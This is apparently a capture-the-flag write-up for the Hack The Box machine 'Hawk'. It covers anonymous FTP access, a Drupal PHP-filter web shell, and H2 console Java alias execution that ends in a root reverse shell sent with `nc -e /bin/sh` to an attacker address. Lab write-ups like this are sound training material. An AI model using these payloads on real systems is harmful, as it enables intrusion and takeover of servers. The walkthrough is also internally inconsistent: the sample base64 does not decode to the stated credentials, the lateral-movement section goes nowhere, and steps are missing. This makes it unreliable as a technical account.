# Hack The Box: Hawk

**Difficulty:** Medium
**OS:** Linux

Hawk is a Medium-level Linux machine focused on exploiting common vulnerabilities in the Drupal content management system and identifying misconfigurations within the H2 Database Engine. The initial compromise requires bypassing an FTP anonymous login to retrieve an encrypted base64 payload, leading to Drupal credentials. After exploiting an authenticated RCE vulnerability in Drupal to gain a foothold, privilege escalation involves discovering a local H2 database instance and exploiting its management console to execute Java code as root.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.102
nmap -p 21,22,80,8082 -sCV 10.10.10.102
```

The scan reveals the following open ports:
*   **Port 21:** FTP (vsftpd 3.0.3)
*   **Port 22:** SSH (OpenSSH 7.6p1 Ubuntu)
*   **Port 80:** HTTP (Apache httpd 2.4.29)
*   **Port 8082:** HTTP (H2 database http console)

Navigating to the web service on port 80 displays a landing page for "Hawk," a corporate website. The site is built on Drupal. Port 8082 hosts an H2 Console login interface.

We add `hawk.htb` to our local `/etc/hosts` file.

```bash
echo "10.10.10.102 hawk.htb" >> /etc/hosts
```

### Enumerating FTP

We test anonymous access to the FTP service using a standard client.

```bash
ftp 10.10.10.102
# Name: anonymous
# Password: (blank)
```

Authentication is successful, and we are logged into the root FTP directory. We list the contents and discover a hidden file named `.messages`.

```bash
ls -la
get .messages
```

We download the file to our attacking machine. Opening `.messages` reveals a Base64-encoded string.

```text
# Example .messages content
VGhlcmUgaXMgYSBzZWNyZXQgbWVzc2FnZSBpbiB0aGlzIGZpbGUsIGFuZCBpdHMgZW5jcnlwdGVkLg==
```

We decode the string using the `base64` command-line utility.

```bash
echo "..." | base64 -d
```

The decoded text reveals credentials for the Drupal portal: `admin:H@wkP@ssw0rd!`.

## Web Exploitation

We navigate to the Drupal administrative login portal (e.g., `http://hawk.htb/user/login`) and authenticate using the credentials extracted from the FTP server.

Authentication is successful, granting us access to the Drupal dashboard.

### Exploiting Drupal (Authenticated RCE)

Because we have administrative access to the Drupal instance, we can leverage built-in features to achieve Remote Code Execution (RCE). A common technique involves enabling the PHP filter module, allowing administrators to embed and execute PHP code directly within node content (posts or pages).

1.  Navigate to **Modules**.
2.  Enable the **PHP filter** module.
3.  Navigate to **Content -> Add content -> Basic page**.
4.  Switch the text format to **PHP code**.

We write a simple PHP web shell payload in the body of the page.

```php
<?php system($_REQUEST['cmd']); ?>
```

We publish the page and note the Node ID or URL. We then access our newly created page, appending the `cmd` parameter.

```text
http://hawk.htb/node/2?cmd=id
```

The command executes successfully. We use the web shell to spawn a reverse shell to our attacking machine.

```bash
nc -lnvp 9999
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

We gain initial access as the `www-data` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is not accessible in our current directory. Checking the `/home` directory reveals a user named `daniel`.

Enumerating the system as `www-data`, we search the web root (`/var/www/html`) for hardcoded database credentials or configuration files. We locate the Drupal `settings.php` file.

```bash
cat /var/www/html/sites/default/settings.php
```

The file reveals plaintext database credentials: `drupal:drupal_password`.

While we can extract database credentials, they are not immediately useful for lateral movement. We explore the system further, specifically checking the `/home/daniel` directory for world-readable files or misconfigurations.

We discover that the user `daniel` has an open SSH port, and we check the `/var/www/html` for additional services. We recall the H2 database console running on port 8082, which we identified during the Nmap scan.

## Privilege Escalation

Enumerating the system as `www-data`, we check for active network connections to identify the H2 database process.

```bash
netstat -tulpn
```

The output confirms the H2 console is listening on `0.0.0.0:8082` (accessible externally) and `127.0.0.1:8082`.

### Exploiting H2 Database Engine (RCE)

The H2 Database Engine is a Java-based relational database management system. The H2 Console is a web-based administration tool. If the console is exposed and accessible without strong authentication, it presents a significant risk.

We navigate to `http://hawk.htb:8082` from our attacking machine. The H2 console requires a JDBC URL, User Name, and Password. By default, the H2 console often accepts a blank password or default credentials (`sa:(blank)`).

We test the default credentials, leaving the password field blank.

```text
JDBC URL: jdbc:h2:~/test
User Name: sa
Password: 
```

Authentication is successful, granting us access to the H2 management console.

A known technique for executing arbitrary code within the H2 database context involves creating a Java alias that maps to a system command execution method, and then calling that alias via SQL. Because the H2 database process is often run as a privileged user (or root in this scenario), the executed commands inherit those privileges.

We execute the following SQL commands within the H2 console to define a Java method that executes a shell command:

```sql
CREATE ALIAS EXEC AS '
String shellexec(String cmd) throws java.io.IOException {
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());
    if (s.hasNext()) {
        return s.next();
    }
    return "";
}
';
```

With the `EXEC` alias defined, we can invoke it to execute arbitrary system commands. We first verify execution by running a simple command.

```sql
CALL EXEC('id');
```

The console returns the output of the `id` command, indicating the H2 process is running as `root`.

```text
uid=0(root) gid=0(root) groups=0(root)
```

We craft a payload to spawn a reverse shell or read the root flag.

```sql
CALL EXEC('nc -e /bin/sh 10.10.14.X 8888');
```

We catch the reverse shell on our Netcat listener.

```bash
nc -lnvp 8888
# Connection received
id
# uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
